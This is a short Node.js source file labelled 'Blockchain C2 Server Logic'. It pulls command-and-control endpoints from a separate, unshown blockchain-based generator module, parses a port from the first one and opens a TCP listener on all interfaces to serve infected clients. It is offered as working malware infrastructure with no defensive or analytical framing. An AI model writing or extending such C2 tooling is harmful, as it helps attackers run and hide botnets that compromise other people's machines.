/**
 * Blockchain C2 Server Logic
 */

const net = require("net");
const { generateC2Candidates } = require("./blockchain_c2_generator");

async function startBlockchainC2Server(handler) {
  const cycle = await generateC2Candidates();
  if (!cycle.endpoints || cycle.endpoints.length === 0) {
    throw new Error("No blockchain C2 endpoints available");
  }
  
  const primary = cycle.endpoints[0];
  const [, portStr] = primary.split(":");
  const port = parseInt(portStr, 10);

  const server = net.createServer(handler);
  await new Promise((resolve, reject) => {
    server.listen(port, "0.0.0.0", (err) => {
      if (err) reject(err);
      else resolve();
    });
  });

  return server;
}

module.exports = { startBlockchainC2Server };

